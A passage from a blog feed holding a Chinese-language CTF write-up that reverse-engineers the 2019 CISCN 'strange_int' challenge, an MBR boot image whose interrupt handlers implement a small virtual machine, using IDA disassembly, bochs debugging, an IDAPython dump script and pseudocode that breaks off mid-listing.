rel="noopener">https://blog.csdn.net/miao_007/article/details/87632758</a><br><a href="https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-code" target="_blank" rel="noopener">https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-code</a><br><a href="https://www.jianshu.com/p/acbf724fdcc9" target="_blank" rel="noopener">https://www.jianshu.com/p/acbf724fdcc9</a><br><a href="https://blog.csdn.net/afei__/article/details/81031965" target="_blank" rel="noopener">https://blog.csdn.net/afei__/article/details/81031965</a><br><a href="https://www.luoxudong.com/360.html" target="_blank" rel="noopener">https://www.luoxudong.com/360.html</a><br><a href="https://www.jianshu.com/p/23af9151837e" target="_blank" rel="noopener">https://www.jianshu.com/p/23af9151837e</a><br><a href="https://juejin.im/post/5afe28446fb9a07aa0483d0a" target="_blank" rel="noopener">https://juejin.im/post/5afe28446fb9a07aa0483d0a</a><br><a href="https://www.52pojie.cn/thread-699268-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-699268-1-1.html</a><br><a href="https://www.52pojie.cn/thread-673175-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-673175-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android JNI 编程及 ARM 汇编入门。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>2019-CISCN-strange_int</title>
    <link href="blog.b3ale.cn/2020/01/24/2019-CISCN-strange-int/"/>
    <id>blog.b3ale.cn/2020/01/24/2019-CISCN-strange-int/</id>
    <published>2020-01-24T08:46:38.000Z</published>
    <updated>2020-03-20T03:07:45.796Z</updated>
    
    <content type="html"><![CDATA[<p>一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。</p><a id="more"></a><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><pre><code>$ file Image.binImage.bin: DOS/MBR boot sector</code></pre><p>先在 IDA 中 16 位的模式打开。在 7C00~7C0E 的代码（MBR 的加载地址是 0x7C00 处）是对寄存器和栈指针进行初始化操作；在 7C0F~7C12 的代码是 x86 系统中的第 17 号调用，设置了显示模式；在 7C14~7C24 的代码是 x86 系统中的第 20 号调用，从软盘的第 0 个磁盘第 0 个柱面第 2 个扇区开始的共 28 个扇区读取数据到内存的 10000000 处；在 7C2B~7C3B 的代码将内存中 10000000~10002000 的数据赋值给内存 0~2000 处；在 7C3D~7C47 的代码初始化 IDT 和 GDT；在 7C4C~7C52 的代码处，启动保护模式，并跳转至 32 位代码段：</p><pre><code class="asm">MBR16:0000 sub_0           proc nearMBR16:0000                 jmp     far ptr 7C0h:5MBR16:0000 sub_0           endpMBR16:0000MBR16:0005MBR16:0005 ; =============== S U B R O U T I N E =======================================MBR16:0005MBR16:0005MBR16:0005 sub_5           proc nearMBR16:0005                 mov     ax, csMBR16:0007                 mov     ds, axMBR16:0009                 assume ds:MBR16MBR16:0009                 mov     ss, axMBR16:000B                 assume ss:MBR16MBR16:000B                 mov     sp, 400hMBR16:000E                 cldMBR16:000F                 mov     ax, 3MBR16:0012                 int     10h             ; - VIDEO - SET VIDEO MODEMBR16:0012                                         ; AL = modeMBR16:0014                 mov     dx, 0MBR16:0017                 mov     cx, 2MBR16:001A                 mov     ax, 1000hMBR16:001D                 mov     es, axMBR16:001F                 assume es:nothingMBR16:001F                 xor     bx, bxMBR16:0021                 mov     ax, 228hMBR16:0024                 int     13h             ; DISK - READ SECTORS INTO MEMORYMBR16:0024                                         ; AL = number of sectors to read, CH = track, CL = sectorMBR16:0024                                         ; DH = head, DL = drive, ES:BX -&gt; buffer to fillMBR16:0024                                         ; Return: CF set on error, AH = status, AL = number of sectors readMBR16:0026                 jnb     short loc_2AMBR16:0028MBR16:0028 loc_28:                                 ; CODE XREF: sub_5:loc_28↓jMBR16:0028                 jmp     short loc_28MBR16:002A ; ---------------------------------------------------------------------------MBR16:002AMBR16:002A loc_2A:                                 ; CODE XREF: sub_5+21↑jMBR16:002A                 cliMBR16:002B                 mov     ax, 1000hMBR16:002E                 mov     ds, axMBR16:0030                 assume ds:nothingMBR16:0030                 xor     ax, axMBR16:0032                 mov     es, axMBR16:0034                 assume es:MBR16MBR16:0034                 mov     cx, 2000hMBR16:0037                 sub     si, siMBR16:0039                 sub     di, diMBR16:003B                 rep movsbMBR16:003D                 mov     ax, 7C0hMBR16:0040MBR16:0040 loc_40:                                 ; DATA XREF: sub_5+D↑rMBR16:0040                 mov     ds, axMBR16:0042                 assume ds:nothingMBR16:0042                 lidt    fword ptr ds:6Fh ; Init IDTMBR16:0047                 lgdt    fword ptr ds:75h ; Init GDTMBR16:004CMBR16:004C loc_4C:                                 ; DATA XREF: sub_5+1F↑rMBR16:004C                 mov     ax, 1            ; Start Protected ModeMBR16:004F                 lmsw    ax               ; Jump to 32-bit CodeMBR16:004F sub_5           endpMBR16:004FMBR16:004F MBR16           ends</code></pre><blockquote><h2 id="何为-IDT-和-GDT？"><a href="#何为-IDT-和-GDT？" class="headerlink" title="何为 IDT 和 GDT？"></a>何为 IDT 和 GDT？</h2><h3 id="GDT"><a href="#GDT" class="headerlink" title="GDT"></a>GDT</h3><p>全局描述表（Global Descriptor Table）。在实时模式下，对一个内存地址的访问是通过段寄存器的方式来进行（一个段具备两个元素：[Base Address, Limit]），即段模式。而在保护模式下（保护模式运行在 32 位系统上），内存的管理模式分为两种，段模式和页模式，其中页模式也是基于段模式的（纯段模式和段页模式）。</p><p>在保护模式下，对一个段的描述则包括 3 方面因素：[Base Address, Limit, Access]，它们加在一起被放在一个 64-bit 长的数据结构中，被称为段描述符。而段寄存器仍然是 16-bit，无法通过 16-bit 长度的段寄存器来直接引用 64-bit 的段描述符。</p><p>解决方法就是把这些长度为 64-bit 的段描述符放入一个数组即 GDT 中。当程序员通过段寄存器来引用一个段描述符时，CPU 必须知道 GDT 的入口，也就是基地址放在哪里，所以 Intel 的设计者门提供了一个寄存器 GDTR 用来存放 GDT 的入口地址，程序员将 GDT 设定在内存中某个位置之后，可以通过 LGDT 指令将 GDT 的入口地址装入此寄存器，从此以后，CPU 就根据此寄存器中的内容作为 GDT 的入口来访问 GDT 了。</p><h3 id="IDT"><a href="#IDT" class="headerlink" title="IDT"></a>IDT</h3><p>中断描述符表（Interrupt Descriptor Table），和 GDT 类似，记录了 0~255 的中断号和调用函数之间的关系。</p><p>段描述符使用数组存储，使用 LIDT 指令将 IDT 的入口地址装入 IDTR 寄存器。</p></blockquote><p>接下来在 IDA 中用 32 位模式打开。一开始的一段代码对 IDT 和 GDT 进行了初始化：</p><pre><code class="asm">seg001:00000205 sub_205         proc nearseg001:00000205                 mov     ds, eaxseg001:00000207                 lss     esp, fword ptr ds:dword_B34+28hseg001:0000020E                 call    IDT_Initseg001:00000213                 call    GDT_Initseg001:00000218                 mov     eax, 10h        ; DATA XREF: sub_28B+27↓rseg001:0000021D                 mov     ds, eaxseg001:0000021F                 assume ds:nothingseg001:0000021F                 mov     es, eaxseg001:00000221                 assume es:nothingseg001:00000221                 mov     fs, eax         ; DATA XREF: sub_283↓rseg001:00000223                 assume fs:nothingseg001:00000223                 mov     gs, eaxseg001:00000225                 assume gs:nothingseg001:00000225                 lss     esp, large ds:0B5Chseg001:00000225                                         ; DATA XREF: sub_28B+11↓oseg001:0000022C                 xor     ebx, ebx</code></pre><p>IDT_init 处，先将 000800FC 赋给了 EAX，将 8E00 赋给了 DX。然后进行了一个 256 次的循环，每次循环从 00080128 的地址开始，分别存入 EAX 和 EDX。最后加载 IDTR，地址为 11C。</p><pre><code class="asm">seg001:0000028B IDT_Init        proc near               ; CODE XREF: sub_205+9↑pseg001:0000028B                 mov     edx, 0FChseg001:00000290                 mov     eax, 80000hseg001:00000295                 mov     ax, dxseg001:00000298                 mov     dx, 8E00hseg001:0000029C                 lea     edi, ds:128hseg001:000002A2                 mov     ecx, 100hseg001:000002A7seg001:000002A7 loc_2A7:                                ; CODE XREF: IDT_Init+25↓jseg001:000002A7                 mov     [edi], eaxseg001:000002A9                 mov     [edi+4], edxseg001:000002AC                 add     edi, 8seg001:000002AF                 dec     ecxseg001:000002B0                 jnz     short loc_2A7seg001:000002B2                 lidt    large fword ptr ds:11Chseg001:000002B9                 retnseg001:000002B9 IDT_Init        endp</code></pre><p>在 bogus 中调试得到 IDTR 中的值为 0x012807ff（可以使用 show mode 命令来判断实模式向保护模式的转换）。依据之前的知识，可以知道基址为 0x0128 以及长度为 0x07ff：</p><pre><code class="bochs">&lt;bochs:40&gt; x 0x11c[bochs]:0x000000000000011c &lt;bogus+       0&gt;:    0x012807ff</code></pre><p>中断门描述符被初始化为 <code>0000 8e00 0008 00fc</code>（偏移：0xfc；段选择符：0x8；P：1，即段是否在内存；DPL：0），如下：</p><pre><code>&lt;bochs:79&gt; x/20 0x128[bochs]:0x0000000000000128 &lt;bogus+       0&gt;:    0x000800fc    0x00008e00    0x000800fc    0x00008e000x0000000000000138 &lt;bogus+      16&gt;:    0x000800fc    0x00008e00    0x000800fc    0x00008e000x0000000000000148 &lt;bogus+      32&gt;:    0x000800fc    0x00008e00    0x000800fc    0x00008e000x0000000000000158 &lt;bogus+      48&gt;:    0x000800fc    0x00008e00    0x000800fc    0x00008e000x0000000000000168 &lt;bogus+      64&gt;:    0x000800fc    0x00008e00    0x000800fc    0x00008e00</code></pre><p>GDT_init 处，加载 GDTR 的地址为 122：</p><pre><code class="asm">seg001:00000283 GDT_Init        proc near               ; CODE XREF: sub_205+E↑pseg001:00000283                 lgdt    large fword ptr ds:122hseg001:0000028A                 retnseg001:0000028A GDT_Init        endp</code></pre><p>同理，可以知道 GDT 基址为 0x0928 以及长度为 0x001f。不过这里没有对 GDT 进行初始化：</p><pre><code class="bochs">&lt;bochs:74&gt; x 0x122[bochs]:0x0000000000000122 &lt;bogus+       0&gt;:    0x0928001f</code></pre><p>在 22E~25F 的代码执行了一个 16 次的循环，其中 0x21~0x30 的中断向量描述符在内存的原始位置在 D08 处，循环中将每个中断向量存储到 128 处；然后调用了 NextHandler 函数，最后调用 <code>INT 21H</code>。</p><pre><code class="asm">seg001:0000022E loc_22E:                                ; CODE XREF: sub_205+58↓jseg001:0000022E                 nopseg001:0000022F                 cmp     ebx, 10hseg001:00000232                 jge     short loc_25Fseg001:00000234                 mov     eax, 80000hseg001:00000239                 lea     edx, ds:0D08h[ebx*4]seg001:00000240                 mov     edx, [edx]seg001:00000242                 mov     ax, dxseg001:00000245                 mov     dx, 8E00hseg001:00000249                 mov     ecx, 21h ; &#39;!&#39;seg001:0000024E                 add     ecx, ebxseg001:00000250                 lea     esi, ds:128h[ecx*8]seg001:00000257                 mov     [esi], eaxseg001:00000259                 mov     [esi+4], edxseg001:0000025C                 inc     ebxseg001:0000025D                 jmp     short loc_22Eseg001:0000025F ; ---------------------------------------------------------------------------seg001:0000025Fseg001:0000025F loc_25F:                                ; CODE XREF: sub_205+2D↑jseg001:0000025F                                         ; sub_205+61↓jseg001:0000025F                 call    NextHandlerseg001:00000264                 int     21h             ; DOS -seg001:00000266                 jmp     short loc_25Fseg001:00000266 sub_205         endp</code></pre><p>获取得到所有中断向量的地址如下：</p><pre><code>...IDT[0x21]=32-Bit Interrupt Gate target=0x0008:0x00000b7c, DPL=0IDT[0x22]=32-Bit Interrupt Gate target=0x0008:0x00000b8a, DPL=0IDT[0x23]=32-Bit Interrupt Gate target=0x0008:0x00000ba1, DPL=0IDT[0x24]=32-Bit Interrupt Gate target=0x0008:0x00000bc1, DPL=0IDT[0x25]=32-Bit Interrupt Gate target=0x0008:0x00000be1, DPL=0IDT[0x26]=32-Bit Interrupt Gate target=0x0008:0x00000bfc, DPL=0IDT[0x27]=32-Bit Interrupt Gate target=0x0008:0x00000c17, DPL=0IDT[0x28]=32-Bit Interrupt Gate target=0x0008:0x00000c32, DPL=0IDT[0x29]=32-Bit Interrupt Gate target=0x0008:0x00000c4f, DPL=0IDT[0x2a]=32-Bit Interrupt Gate target=0x0008:0x00000c6c, DPL=0IDT[0x2b]=32-Bit Interrupt Gate target=0x0008:0x00000c84, DPL=0IDT[0x2c]=32-Bit Interrupt Gate target=0x0008:0x00000c96, DPL=0IDT[0x2d]=32-Bit Interrupt Gate target=0x0008:0x00000cb5, DPL=0IDT[0x2e]=32-Bit Interrupt Gate target=0x0008:0x00000cf7, DPL=0IDT[0x2f]=32-Bit Interrupt Gate target=0x0008:0x00000ce0, DPL=0IDT[0x30]=32-Bit Interrupt Gate target=0x0008:0x00000cd4, DPL=0...</code></pre><p>在 IDA 中定位到所有中断向量的地址，分别对应着不同的函数，这一段代码后面会用到：</p><pre><code class="asm">seg001:00000D7C                 lea     ecx, ds:0B64h[ecx*4]seg001:00000D83                 mov     [ecx], eaxseg001:00000D85                 jmp     loc_EF8seg001:00000D8A ; ---------------------------------------------------------------------------seg001:00000D8A                 lea     eax, ds:0B64h[eax*4]seg001:00000D91                 mov     eax, [eax]seg001:00000D93                 lea     ecx, ds:0B64h[ecx*4]seg001:00000D9A                 mov     [ecx], eaxseg001:00000D9C                 jmp     loc_EF8seg001:00000DA1 ; ---------------------------------------------------------------------------seg001:00000DA1                 lea     eax, ds:0B64h[eax*4]seg001:00000DA8                 mov     eax, [eax]seg001:00000DAA                 lea     ecx, ds:0B64h[ecx*4]seg001:00000DB1                 lea     eax, ds:0D48h[eax*4]seg001:00000DB8                 mov     eax, [eax]seg001:00000DBA                 mov     [ecx], eaxseg001:00000DBC                 jmp     loc_EF8seg001:00000DC1 ; ---------------------------------------------------------------------------seg001:00000DC1                 lea     eax, ds:0B64h[eax*4]seg001:00000DC8                 mov     eax, [eax]seg001:00000DCA                 lea     ecx, ds:0B64h[ecx*4]seg001:00000DD1                 mov     ecx, [ecx]seg001:00000DD3                 lea     ecx, ds:0D48h[ecx*4]seg001:00000DDA                 mov     [ecx], eaxseg001:00000DDC                 jmp     loc_EF8seg001:00000DE1 ; ---------------------------------------------------------------------------seg001:00000DE1                 lea     eax, ds:0B64h[eax*4]seg001:00000DE8                 mov     edx, [eax]seg001:00000DEA                 lea     ecx, ds:0B64h[ecx*4]seg001:00000DF1                 mov     eax, [ecx]seg001:00000DF3                 add     eax, edxseg001:00000DF5                 mov     [ecx], eaxseg001:00000DF7                 jmp     loc_EF8seg001:00000DFC ; ---------------------------------------------------------------------------seg001:00000DFC                 lea     eax, ds:0B64h[eax*4]seg001:00000E03                 mov     edx, [eax]seg001:00000E05                 lea     ecx, ds:0B64h[ecx*4]seg001:00000E0C                 mov     eax, [ecx]seg001:00000E0E                 sub     eax, edxseg001:00000E10                 mov     [ecx], eaxseg001:00000E12                 jmp     loc_EF8seg001:00000E17 ; ---------------------------------------------------------------------------seg001:00000E17                 lea     eax, ds:0B64h[eax*4]seg001:00000E1E                 mov     edx, [eax]seg001:00000E20                 lea     ecx, ds:0B64h[ecx*4]seg001:00000E27                 mov     eax, [ecx]seg001:00000E29                 xor     eax, edxseg001:00000E2B                 mov     [ecx], eaxseg001:00000E2D                 jmp     loc_EF8seg001:00000E32 ; ---------------------------------------------------------------------------seg001:00000E32                 lea     eax, ds:0B64h[eax*4]seg001:00000E39                 mov     eax, [eax]seg001:00000E3B                 lea     edx, ds:0B64h[ecx*4]seg001:00000E42                 mov     cl, alseg001:00000E44                 mov     eax, [edx]seg001:00000E46                 shl     eax, clseg001:00000E48                 mov     [edx], eaxseg001:00000E4A                 jmp     loc_EF8seg001:00000E4F ; ---------------------------------------------------------------------------seg001:00000E4F                 lea     eax, ds:0B64h[eax*4]seg001:00000E56                 mov     eax, [eax]seg001:00000E58                 lea     edx, ds:0B64h[ecx*4]seg001:00000E5F                 mov     cl, alseg001:00000E61                 mov     eax, [edx]seg001:00000E63                 shr     eax, clseg001:00000E65                 mov     [edx], eaxseg001:00000E67                 jmp     loc_EF8seg001:00000E6C ; ---------------------------------------------------------------------------seg001:00000E6C                 lea     eax, ds:0B64h[eax*4]seg001:00000E73                 mov     eax, [eax]seg001:00000E75                 lea     ecx, ds:0B64h[ecx*4]seg001:00000E7C                 mov     edx, [ecx]seg001:00000E7E                 and     eax, edxseg001:00000E80                 mov     [ecx], eaxseg001:00000E82                 jmp     short loc_EF8seg001:00000E84 ; ---------------------------------------------------------------------------seg001:00000E84                 lea     eax, ds:0B64h[ecx*4]seg001:00000E8B                 mov     eax, [eax]seg001:00000E8D                 lea     ecx, dword_B34+44hseg001:00000E93                 mov     [ecx], eaxseg001:00000E95                 iretseg001:00000E96 ; ---------------------------------------------------------------------------seg001:00000E96                 lea     eax, ds:0B64h[eax*4]seg001:00000E9D                 mov     eax, [eax]seg001:00000E9F                 test    eax, eaxseg001:00000EA1                 jnz     short loc_EF8seg001:00000EA3                 lea     eax, ds:0B64h[ecx*4]seg001:00000EAA                 mov     eax, [eax]seg001:00000EAC                 lea     ecx, dword_B34+44hseg001:00000EB2                 mov     [ecx], eaxseg001:00000EB4                 iretseg001:00000EB5 ; ---------------------------------------------------------------------------seg001:00000EB5                 lea     eax, ds:0B64h[eax*4]seg001:00000EBC                 mov     eax, [eax]seg001:00000EBE                 test    eax, eaxseg001:00000EC0                 jz      short loc_EF8seg001:00000EC2                 lea     eax, ds:0B64h[ecx*4]seg001:00000EC9                 mov     eax, [eax]seg001:00000ECB                 lea     ecx, dword_B34+44hseg001:00000ED1                 mov     [ecx], eaxseg001:00000ED3                 iretseg001:00000ED4 ; ---------------------------------------------------------------------------seg001:00000ED4                 lea     eax, unk_F94seg001:00000EDA                 call    sub_2EAseg001:00000EDF                 hltseg001:00000EE0 ; ---------------------------------------------------------------------------seg001:00000EE0                 lea     eax, unk_FA0seg001:00000EE6                 call    sub_2EAseg001:00000EEB                 lea     eax, word_FAEseg001:00000EF1                 call    sub_2EAseg001:00000EF6                 hlt</code></pre><p>接下来在 NextHandler 处，包括 <code>INT 21H</code> 的三条指令，类似于一个 switch 语句，根据以前的做题经验，基本可以判断出是个虚拟机。在 NextHandler 函数中，首先从 B78 处获取值作为 D48 的偏移，将 D48 处的值分别赋值给 给 065（操作符）、ecx（操作数 1）、eax（操作数 2），而 065 地址处的值为 21H，即指令 <code>INT 21H</code> 的操作数，故这里中断的调用是和 edi 的取值有关系的：</p><pre><code class="asm">seg001:00000268 NextHandler     proc near               ; CODE XREF: sub_205:loc_25F↑pseg001:00000268                 mov     edi, large ds:0B78hseg001:0000026E                 lea     edi, ds:0D48h[edi*4]seg001:00000275                 mov     eax, [edi]seg001:00000277                 mov     large ds:65h, alseg001:0000027C                 mov     ecx, [edi+4]seg001:0000027F                 mov     eax, [edi+8]seg001:00000282                 retnseg001:00000282 NextHandler     endp</code></pre><p>回过去看上面中断代码的最后一部分是将上面 edi 中的值加 3，即取下一组指令：</p><pre><code class="asm">seg001:00000EF8 loc_EF8:                                ; CODE XREF: seg001:00000D85↑jseg001:00000EF8                                         ; seg001:00000D9C↑j ...seg001:00000EF8                 lea     ecx, dword_B34+44hseg001:00000EFE                 mov     eax, [ecx]seg001:00000F00                 add     eax, 3seg001:00000F03                 mov     [ecx], eaxseg001:00000F05                 iret</code></pre><p>那么之前的那段代码就是不同的操作符时进行的中断调用。这里就先把每个中断的部分的代码进行翻译（buf 的地址为 B64，code 的地址为 D48，pc 的地址为 B78）：</p><table><thead><tr><th style="text-align:center">中断编号</th><th style="text-align:center">功能描述</th></tr></thead><tbody><tr><td style="text-align:center">0x21</td><td style="text-align:center"><code>buf[a] = b</code></td></tr><tr><td style="text-align:center">0x22</td><td style="text-align:center"><code>buf[a] = buf[b]</code></td></tr><tr><td style="text-align:center">0x23</td><td style="text-align:center"><code>buf[a] = code[buf[b]]</code></td></tr><tr><td style="text-align:center">0x24</td><td style="text-align:center"><code>code[buf[a]] = buf[b]</code></td></tr><tr><td style="text-align:center">0x25</td><td style="text-align:center"><code>buf[a] += buf[b]</code></td></tr><tr><td style="text-align:center">0x26</td><td style="text-align:center"><code>buf[a] -= buf[b]</code></td></tr><tr><td style="text-align:center">0x27</td><td style="text-align:center"><code>buf[a] ^= buf[b]</code></td></tr><tr><td style="text-align:center">0x28</td><td style="text-align:center"><code>buf[a] &lt;&lt;= buf[b]</code></td></tr><tr><td style="text-align:center">0x29</td><td style="text-align:center"><code>buf[a] &gt;&gt;= buf[b]</code></td></tr><tr><td style="text-align:center">0x2A</td><td style="text-align:center"><code>buf[a] &amp;= buf[b]</code></td></tr><tr><td style="text-align:center">0x2B</td><td style="text-align:center"><code>pc = a</code></td></tr><tr><td style="text-align:center">0x2C</td><td style="text-align:center"><code>if(buf[b] == 0) pc = buf[a]</code></td></tr><tr><td style="text-align:center">0x2D</td><td style="text-align:center"><code>if(buf[b] != 0) pc = buf[a]</code></td></tr><tr><td style="text-align:center">0x2E</td><td style="text-align:center">终止 CPU 运行，即 hlt 指令</td></tr><tr><td style="text-align:center">0x2F</td><td style="text-align:center">输出 flag 正确提示</td></tr><tr><td style="text-align:center">0x30</td><td style="text-align:center">输出 flag 错误提示</td></tr></tbody></table><p>根据上面的分析，用 IDAPython 把虚拟机指令 dump 下来：</p><pre><code class="python">code = []for addr in range(0x0F48, 0x11E0, 12):    ins = Dword(addr)    op1 = Dword(addr + 4)    op2 = Dword(addr + 8)    code.append(ins)    code.append(op1)    code.append(op2)print code</code></pre><p>然后用脚本处理一下，得到伪代码：</p><pre><code class="python">buf[0] = 129buf[1] ^= buf[1]code[buf[1]] = buf[1] # 0buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;129&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;129&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;130&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;130&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;131&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;131&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;132&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;132&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;133&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;133&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;134&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;134&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;135&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;135&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;136&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;136&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;137&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;137&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[0] = 129buf[1] = buf[0]buf[2] = 9buf[1] += buf[2]buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;129&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;138&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126print &#39;wrong&#39;</code></pre><p>上面是在 <code>buf[3] != 0</code> 的时候，输出 wrong 的情况，如果在这个条件判断中都正确的话，会产生以下代码：</p><pre><code class="python">buf[0] = 129buf[1] = buf[0]buf[2] = 9buf[1] += buf[2]buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;129&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;138&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;130&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;139&#39;)buf[3] -= 